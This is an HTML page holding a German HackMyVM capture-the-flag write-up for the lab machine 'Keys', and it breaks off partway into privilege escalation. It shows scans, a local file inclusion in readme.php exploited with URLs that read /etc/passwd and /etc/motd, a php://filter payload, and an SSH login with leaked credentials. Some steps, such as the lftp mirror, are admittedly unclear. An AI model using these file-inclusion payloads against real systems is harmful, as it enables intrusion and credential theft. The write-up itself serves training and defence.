@@ -1,0 +1,848 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Keys - HackMyVM - Hard - Vulnhub - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg"> <!-- CSS muss background-color: #03b5f5; setzen -->
+        <h1>Keys - HackMyVM - Level: Hard - Bericht</h1>
+        <div class="level-container">
+            <!-- CSS muss hier die Farbe auf Rot setzen -->
+            <h2>Hard</h2>
+            <div class="circle">
+                 <!-- CSS muss hier die Farbe auf Rot setzen -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                 <!-- CSS muss hier die Hintergrundfarbe auf ein passendes Rot setzen -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">unzip</div>
+                <div class="tool-item">lftp</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">chsh</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">rev</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">vi (oder nano)</div>
+                <div class="tool-item">ssh2john</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">gpg2john</div>
+                <div class="tool-item">gpg</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">dcode.fr (Web)</div>
+                <div class="tool-item">8gwifi.org (Web)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept (Root Exploit)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Der `arp-scan -l` Befehl wird zur Identifizierung aktiver Hosts im lokalen Netzwerksegment verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Host mit der IP <span class="command">192.168.2.147</span> und der MAC `08:00:27:5f:dd:6e` (PCS Systemtechnik GmbH / VirtualBox) wird gefunden. Dies ist das Zielsystem "Keys".</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die IP 192.168.2.147 für weitere Scans.
+            <br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann die Sichtbarkeit von Hosts einschränken.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.147	08:00:27:5f:dd:6e	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan wird auf die Ziel-IP 192.168.2.147 durchgeführt, um offene Ports, Dienste, Versionen und Betriebssysteminformationen zu ermitteln (`-sS -sC -T5 -sV -A -p-`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert zwei offene Ports:
+            <ul><li><span class="command">22/tcp (SSH)</span>: OpenSSH 8.4p1 auf Debian 5. Standard-Login-Dienst.</li><li><span class="command">80/tcp (HTTP)</span>: Nginx 1.18.0. Ein Webserver läuft und liefert den Titel "The World of Keys".</li></ul>
+            Am Ende des Scans tritt ein <span class="password">Segmentation Fault</span> auf, was auf ein Problem mit Nmap oder dem Zielsystem während des Scans hindeuten könnte, die relevanten Portinformationen wurden jedoch bereits gesammelt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Webserver auf Port 80 genauer. Halten Sie SSH als Login-Möglichkeit bereit, falls Zugangsdaten gefunden werden. Ignorieren Sie den Segmentation Fault vorerst, da die benötigten Informationen extrahiert wurden.
+            <br><strong>Empfehlung (Admin):</strong> Halten Sie SSH und Nginx aktuell. Untersuchen Sie die Ursache für den Segmentation Fault bei Nmap-Scans, falls dieser reproduzierbar ist (könnte auf Systeminstabilität oder IDS/IPS-Aktivität hindeuten).</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.147 -p-</span></div>
+                    <pre>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-13 11:01 CEST
+Nmap scan report for keys (192.168.2.147)
+Host is up (0.00017s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span>
+| ssh-hostkey:
+|   3072 6e:b1:d1:09:f5:dc:01:29:ed:9d:4f:8e:a7:7a:a0:a6 (RSA)
+|   256 35:f4:29:df:64:6a:be:7f:9f:0a:9f:ee:07:e4:19:07 (ECDSA)
+|_  256 4e:0f:f7:32:cc:c7:91:57:07:d9:50:0a:38:c9:e5:11 (ED25519)
+<span class="command">80/tcp open  http    nginx 1.18.0</span>
+|_http-title: The World of Keys
+|_http-server-header: nginx/1.18.0
+MAC Address: 08:00:27:5F:DD:6E (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.17 ms keys (192.168.2.147)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.09 seconds
+<span class="password">zsh: segmentation fault  nmap -sS -sC -T5 -sV -A 192.168.2.147 -p-</span></pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+             <p class="analysis"><strong>Analyse:</strong> `gobuster` wird zur Verzeichnis- und Dateisuche auf dem Webserver verwendet. Eine gängige Wortliste (`common.txt`) und eine umfangreiche Liste von Erweiterungen werden genutzt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet mehrere interessante Dateien:
+             <ul><li>`/index.html`: Die Startseite.</li><li>`<span class="command">/id_rsa.zip</span>`: Ein ZIP-Archiv, das potenziell einen privaten SSH-Schlüssel enthält. Dies ist ein kritischer Fund. Die Größe (66M) ist ungewöhnlich groß für einen einzelnen Schlüssel.</li><li>`<span class="command">/readme.php</span>`: Eine PHP-Datei, die möglicherweise Hinweise oder weitere Informationen enthält.</li></ul></p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+             <ol><li>Laden Sie `id_rsa.zip` herunter und untersuchen Sie den Inhalt.</li><li>Rufen Sie `readme.php` auf und analysieren Sie den Inhalt und den Quellcode.</li></ol>
+             <strong>Empfehlung (Admin):</strong> Speichern Sie niemals private Schlüssel oder Archive mit Schlüsseln im Web-Root oder anderen öffentlich zugänglichen Bereichen. Entfernen Sie unnötige PHP-Dateien oder Readme-Dateien.</p>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/k3ysSsSsSsSsS]
+└─# <span class="command">gobuster dir -u http://192.168.2.147 -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv -t 100 -e -s "200,204,301,302,307,401"</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.1.0
+[...]
+===============================================================
+[...]
+<span class="command">/index.html</span>           (Status: 200) [Size: 135]
+<span class="command">/id_rsa.zip</span>           (Status: 200) [Size: 69167472]
+<span class="command">/readme.php</span>           (Status: 200) [Size: 398]
+[...]
+===============================================================
+</pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die Datei `/readme.php` wird mit `curl` abgerufen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Seite selbst zeigt nur "[ Read Me. ]". Im HTML-Quellcode (nicht direkt von `curl` gezeigt, aber im nächsten Schritt extrahiert) befindet sich ein Kommentar: `<!-- Here is a Gift for you <span class="password">Ayr43KwSdwpWQw6HFce8SaMmpWH12XsUF</span> -->`. Der Text erwähnt, dass dieser Base58-String mit dcode.fr zu `<span class="password">my_personal_wordlist.txt</span>` dekodiert werden kann. Dies ist ein Hinweis auf eine potenzielle Wortliste, die auf dem System existieren könnte.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Merken Sie sich den Dateinamen `my_personal_wordlist.txt`. Suchen Sie nach dieser Datei, nachdem Sie initialen Zugriff erlangt haben. Untersuchen Sie den Quellcode von `readme.php` genauer (wie im nächsten Schritt), da PHP-Dateien serverseitige Logik enthalten können.
+             <br><strong>Empfehlung (Admin):</strong> Hinterlassen Sie keine Hinweise oder verschlüsselten/kodierten Informationen im Quellcode oder in Kommentaren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.147/readme.php</span></div>
+                    <pre>
+ 
+    <p>[ Read Me. ]</p>
+    <!-- Here is a Gift for you Ayr43KwSdwpWQw6HFce8SaMmpWH12XsUF -->
+ 
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Datei `id_rsa.zip` wird mit `wget` heruntergeladen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Download ist erfolgreich. Die große Datei (66 MB) wird lokal gespeichert und muss nun untersucht werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Entpacken Sie `id_rsa.zip` und analysieren Sie den Inhalt. Aufgrund der Größe handelt es sich wahrscheinlich um ein großes Archiv mit vielen Schlüsseln oder anderen Daten.
+            <br><strong>Empfehlung (Admin):</strong> (Siehe vorherige Empfehlung zum Speichern von Schlüsseln im Web-Root).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.147/id_rsa.zip</span></div>
+                    <pre>
+--2022-10-13 11:06:11--  http://192.168.2.147/id_rsa.zip
+Connecting to 192.168.2.147:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 69167472 (66M) [application/zip]
+Saving to: ‘id_rsa.zip’
+
+id_rsa.zip                    100%[=====================================================>]  65.96M   156MB/s    in 0.4s
+
+<span class="password">2022-10-13 11:06:11 (156 MB/s) - ‘id_rsa.zip’ saved [69167472/69167472]</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Base64-kodierter String wird dekodiert. Der String enthält den HTML-Code der `readme.php`-Seite und zusätzlich den PHP-Quellcode dieser Datei.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der PHP-Code von `readme.php` wird enthüllt:
+            `<span class="password"><?php include($GET['34sy']); // ... Kommentare ... ?></span>`
+            Dies zeigt eine kritische Local File Inclusion (LFI)-Schwachstelle. Der Wert des GET-Parameters `34sy` wird direkt in eine `include`-Anweisung eingefügt. Dies erlaubt das Einbinden und potenziell Ausführen beliebiger lokaler Dateien auf dem Server, auf die der Webserver-Benutzer (`www-data`) Lesezugriff hat. Die Kommentare erwähnen erneut Base58/Z85 und `id_rsa.zip`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Nutzen Sie die LFI-Schwachstelle, um wichtige Dateien zu lesen:</li><li>`/etc/passwd`: `http://192.168.2.147/readme.php?34sy=/etc/passwd`</li><li>`/etc/hosts`, `/etc/ssh/sshd_config` etc.</li><li>Versuchen Sie, den Quellcode anderer PHP-Dateien zu lesen (z.B. mit `php://filter`): `http://192.168.2.147/readme.php?34sy=php://filter/convert.base64-encode/resource=index.php`</li><li>Suchen Sie nach Wegen, die LFI zur Remote Code Execution (RCE) zu eskalieren (Log Poisoning, `/proc/self/environ`, PHP-Sessions).</li></ol>
+            <strong>Empfehlung (Admin):</strong> Beheben Sie die LFI-Schwachstelle in `readme.php` dringend, indem Sie Benutzereingaben validieren und sicherstellen, dass nur erlaubte Dateien eingebunden werden können. Verwenden Sie niemals Benutzereingaben direkt in `include`/`require`-Anweisungen. Entfernen Sie die `readme.php` oder kommentieren Sie die `include`-Zeile aus.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo "PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICA8c3R5bGU+CiAgICAuY2VudGVyIHsKICAgIG1hcmdpbjogMDsKICAgIHBvc2l0aW9uiBhYnNvbHV0ZTsKICAgIHRvcDogNTAlwogICAgbGVmdDogNTAlwogICAgZm9udC1zaXpliAxMDBweDsKICAgIC1tcy10cmFuc2Zvcm06IHRyYW5zbGF0ZSgtNTAlLCAtNTAlKTsKICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlKC01MCUsIC01MCUpwogIH0KICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgogIDxkaXYgY2xhc3M9ImNlbnRlciI+CiAgICA8cD5bIFJlYWQgTWUuIF08L3A+CiAgICA8IS0tIEhlcmUgaXMgYSBHaWZ0IGZvciB5b3UgQXlyNDNLd1Nkd3BXUXc2SEZjZThTYU1tcFdIMTJYc1VGIC0tPgogIDwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4KCgo8P3BocAogICAgaW5jbHVkZSgkX0dFVFsnMzRzeSddKTsKICAgIC8vIFRoZSBXb3JsZCBvZiBLZXlzIGFyZSBIZXJlIHlDUWxTcS8rKFVxLysoVXFWCiAgICAvLyBJIExvdmUgWjg1IChaZXJvTVEpIDopCiAgICAvLyBvbmUgbW9yZSBnaWZ0IGZvciB5b3UgikgaWRfcnNhLnppcAo/Pgo=" -n | base64 -d</span></div>
+                    <pre>
+ 
+    <p>[ Read Me. ]</p>
+    < -- Here is a Gift for you Ayr43KwSdwpWQw6HFce8SaMmpWH12XsUF -->
+ 
+
+
+<span class="password"> 
+    include($GET['34sy']);
+    // The World of Keys are Here yCQlSq/+(Uq/+(UqV
+    // I Love Z85 (ZeroMQ) :)
+    // one more gift for you :) id_rsa.zip
+ </span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Das heruntergeladene Archiv `id_rsa.zip` wird entpackt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Archiv enthält eine Verzeichnisstruktur (`id_rsa/2048/pub/`), in der sich offenbar sehr viele öffentliche SSH-Schlüssel befinden (die Namen sehen wie Hashes + Nummer aus). Dies erklärt die Größe des Archivs. Es scheint sich um eine Sammlung öffentlicher Schlüssel zu handeln.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese Schlüssel allein sind nicht direkt nützlich. Es könnte jedoch sein, dass ein zugehöriger privater Schlüssel an anderer Stelle auf dem System oder über die LFI gefunden werden kann. Bewahren Sie die extrahierten Schlüssel auf, falls Sie später einen privaten Schlüssel finden und den zugehörigen öffentlichen Schlüssel identifizieren müssen.
+            <br><strong>Empfehlung (Admin):</strong> (Siehe vorherige Empfehlung zum Speichern von Schlüsseln).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">unzip id_rsa.zip</span></div>
+                    <pre>
+Archive:  id_rsa.zip
+   creating: id_rsa/
+   creating: id_rsa/2048/
+   creating: id_rsa/2048/pub/
+  inflating: id_rsa/2048/pub/0fc8df0bf2b5553484d3a19dfc654de5-15528.pub
+  inflating: id_rsa/2048/pub/0f12255242a960b01f3893f3b2022856-8179.pub
+  inflating: id_rsa/2048/pub/0e1fefb0bb44cc1a83d8cb73452c53c9-4212.pub
+  inflating: id_rsa/2048/pub/0dc75803ce91497cb9b571e8bf14b47c-29500.pub
+<span class="comment">  [... viele weitere Dateien ...]</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, mit `lftp mirror` ein Verzeichnis namens `k3ysSsSsSsSsS` vom Webserver herunterzuladen. Anschließend wird in dieses lokal erstellte Verzeichnis gewechselt und dessen Inhalt aufgelistet, wobei nach Dateien gefiltert wird, die *nicht* die Größe 960 haben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der `lftp mirror`-Befehl schlägt wahrscheinlich fehl oder ist hier fehl am Platz, da kein solches Verzeichnis auf dem Webserver bekannt ist. Der Fokus auf die Dateigröße 960 und die Suche nach einer Datei `id_rsa-4695` im Verzeichnis `k3ysSsSsSsSsS` (das vermutlich manuell erstellt oder aus einem anderen Kontext stammt) ist unklar. Es wird jedoch eine Datei `id_rsa-4695` gefunden, die eine Notiz enthält.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Schritte mit `lftp` und dem spezifischen Verzeichnis/Dateigrößenfilter sind verwirrend und scheinen nicht direkt aus den vorherigen Schritten zu folgen. Konzentrieren Sie sich auf die LFI-Schwachstelle. Der Inhalt von `id_rsa-4695` ("HaHa you found me...") ist wahrscheinlich ein Hinweis und nicht der eigentliche private Schlüssel. Suchen Sie nach der Datei `a473e40621001f61dbf97b310b1caefb-4695` (die zum Public Key passt, der später gefunden wird) auf dem System, möglicherweise über die LFI.
+            <br><strong>Empfehlung (Admin):</strong> Keine direkten Maßnahmen basierend auf diesen unklaren Schritten, außer der allgemeinen Empfehlung, keine unnötigen Hinweise auf dem System zu hinterlassen.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">lftp -c mirror http://192.168.2.147/k3ysSsSsSsSsS</span></div>
+                    <pre><span class="comment">[Fehler oder leere Übertragung erwartet]</span></pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cd k3ysSsSsSsSsS</span></div> <span class="comment">(Verzeichnis muss existieren)</span>
+                    <div class="prompt">┌──(root㉿cyber)-[~/k3ysSsSsSsSsS]
+└─# <span class="command">ls -la | grep -v 960</span></div>
+                     <pre>
+drwxr-xr-x  2 root root 274432 13. Okt 11:12 .
+drwx------ 38 root root   4096 13. Okt 11:12 ..
+-rw-r--r--  1 root root    980 27. Okt 2021  <span class="command">id_rsa-4695</span></pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/k3ysSsSsSsSsS]
+└─# <span class="command">find . -name "*4695"</span></div>
+                     <pre>./id_rsa-4695</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/k3ysSsSsSsSsS]
+└─# <span class="command">cat id_rsa-4695</span></div>
+                     <pre>
+HaHa you found me :)
+
+here is a little note for you:-
+
+If you get stuck, Remember I'm here just for you</pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Es wird `find` auf dem lokalen Angreifer-System ausgeführt, um nach einer Datei zu suchen, die einem bestimmten Hash-Muster und der Nummer `-4695` entspricht. Dies hängt wahrscheinlich mit dem Versuch zusammen, einen privaten Schlüssel zu finden, der zu einem der öffentlichen Schlüssel aus `id_rsa.zip` passt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Befehl findet die Datei an zwei Orten im lokalen Dateisystem des Angreifers. Dies deutet darauf hin, dass der Angreifer möglicherweise bereits eine Sammlung von privaten Schlüsseln besitzt oder diese zuvor heruntergeladen hat (z.B. über den `lftp mirror`-Versuch oder aus einem anderen Leak). Die Datei `a473e40621001f61dbf97b310b1caefb-4695` ist der potenzielle private Schlüssel.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Behalten Sie den Pfad zu diesem privaten Schlüssel im Auge. Sie benötigen den zugehörigen Benutzernamen und müssen bestätigen, dass der Schlüssel auf dem Zielsystem verwendet wird (z.B. indem der öffentliche Schlüssel in einer `authorized_keys`-Datei gefunden wird).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/k3ysSsSsSsSsS]
+└─# <span class="command">find / -name "a473e40621001f61dbf97b310b1caefb-4695"</span></div>
+                     <pre>
+/root/id_rsa/2048/private/a473e40621001f61dbf97b310b1caefb-4695
+/root/HackingTools/openssl_5720_hack/rsa/2048/a473e40621001f61dbf97b310b1caefb-4695</pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access</h2>
+
+             <p class="analysis"><strong>Analyse:</strong> Die LFI-Schwachstelle in `readme.php` wird genutzt, um den Inhalt von `/etc/passwd` auszulesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Befehl ist erfolgreich und listet die Benutzerkonten des Systems auf. Relevante Benutzer mit Shell (`/bin/bash`) sind: `root`, `<span class="command">steve</span>`, `<span class="command">jack</span>`, `<span class="command">rachel</span>`, `<span class="command">useless</span>`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die Benutzernamen. Versuchen Sie als Nächstes, weitere sensible Dateien über LFI zu lesen, z.B. `/etc/shadow` (unwahrscheinlich wegen Berechtigungen), `/etc/motd`, SSH-Konfigurationsdateien oder Home-Verzeichnisse (falls Berechtigungen es zulassen).
+             <br><strong>Empfehlung (Admin):</strong> Beheben Sie die LFI-Schwachstelle.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="comment"># Aufruf im Browser oder mit curl:</span>
+<span class="command">http://192.168.2.147/readme.php?34sy=/etc/passwd</span></pre>
+                    <pre><span class="comment">
+# Ausgabe (bereinigt):</span>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+<span class="command">steve:x:1000:1000:steve,,,:/home/steve:/bin/bash</span>
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+<span class="command">jack:x:1001:1001::/home/jack:/bin/bash</span>
+<span class="command">rachel:x:1002:1002::/home/rachel:/bin/bash</span>
+<span class="command">useless:x:1003:1003::/home/useless:/bin/bash</span>
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+</pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die LFI-Schwachstelle wird genutzt, um den Inhalt von `/etc/motd` (Message of the Day) auszulesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Kritischer Fund!</span> Die MOTD-Datei enthält die Zugangsdaten für den Benutzer `useless` im Klartext: `<span class="password">[ useless:user ]</span>`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die Zugangsdaten `useless`:`user`, um sich per SSH auf dem Zielsystem anzumelden.
+             <br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Passwörter oder sensible Informationen in der MOTD oder anderen öffentlich lesbaren Systemdateien.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="comment"># Aufruf im Browser oder mit curl:</span>
+<span class="command">http://192.168.2.147/readme.php?34sy=/etc/motd</span></pre>
+                    <pre><span class="comment">
+# Ausgabe (bereinigt, relevanter Teil):</span>
+[...]
+The programs included with the Debian GNU/Linux system are free software;
+<span class="password">[ useless:user ]</span>   <<<--------------------------
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+[...]
+</pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich per SSH als Benutzer `useless` mit dem in der MOTD gefundenen Passwort `user` anzumelden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Login erfolgreich!</span> Nach einigen Fehlversuchen (im Text gezeigt) gelingt der Login. Der Angreifer hat nun eine Shell als Benutzer `useless`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie Enumeration als `useless` durch (`sudo -l`, Home-Verzeichnis prüfen, `user.txt`/`youser.txt` suchen).
+             <br><strong>Empfehlung (Admin):</strong> Starke Passwörter erzwingen, keine Passwörter in MOTD.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/k3ysSsSsSsSsS]
+└─# <span class="command">ssh useless@192.168.2.147</span></div>
+                     <pre>
+The authenticity of host '192.168.2.147 (192.168.2.147)' can't be established.
+[...]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.2.147' (ED25519) to the list of known hosts.
+useless@192.168.2.147's password: <span class="comment">(Falsches Passwort)</span>
+Permission denied, please try again.
+useless@192.168.2.147's password: <span class="comment">(Falsches Passwort)</span>
+Permission denied, please try again.
+useless@192.168.2.147's password: <span class="command">user</span>
+Linux keys 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+[ useless:user ] the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Oct 28 12:58:34 2021 from 192.168.1.5
+<span class="prompt">useless@keys:~$ </span></pre>
+                 </div>
+             </div>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `useless` werden die `sudo`-Rechte geprüft und das Home-Verzeichnis untersucht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `useless` hat keine `sudo`-Rechte (`Sorry, user useless may not run sudo on keys.`). Im Home-Verzeichnis befindet sich eine Datei `youser.txt`, die einen Teil der User-Flag enthält: `<span class="password">4vJkf*</span>`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie diesen Teil der Flag. Suchen Sie nach anderen Wegen zur Rechteausweitung oder Lateral Movement (SUID-Binaries, Cronjobs, lesbare Home-Verzeichnisse anderer Benutzer).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">useless@keys:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+[sudo] password for useless: <span class="command">user</span>
+<span class="password">Sorry, user useless may not run sudo on keys.</span></pre>
+                    <div class="prompt">useless@keys:~$ <span class="command">ls</span></div>
+                    <pre>youser.txt</pre>
+                    <div class="prompt">useless@keys:~$ <span class="command">cat youser.txt</span></div>
+                    <pre><span class="password">4vJkf*</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Home-Verzeichnisse anderer Benutzer werden aufgelistet. Ein ungewöhnlicher, tiefer Verzeichnispfad unter `/home/rachel` wird entdeckt, der Schreibrechte für die Gruppe `useless` hat. Der Inhalt dieses Verzeichnisses und des entsprechenden Pfades unter `/etc/ssh/sshd_config.d` wird untersucht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Pfad `/home/rachel/the/secret/file/is/in/etc/ssh/sshd_config.d` ist ein klarer Hinweis. In `/etc/ssh/sshd_config.d` befindet sich eine versteckte Datei `.rachel_key.private`, die nur von `root` und der Gruppe `www-data` lesbar ist. Da `useless` nicht zur Gruppe `www-data` gehört, kann er die Datei nicht direkt lesen. Der Pfad im Rachel-Homeverzeichnis ist leer, scheint aber ein Köder oder eine Sackgasse zu sein.</p>
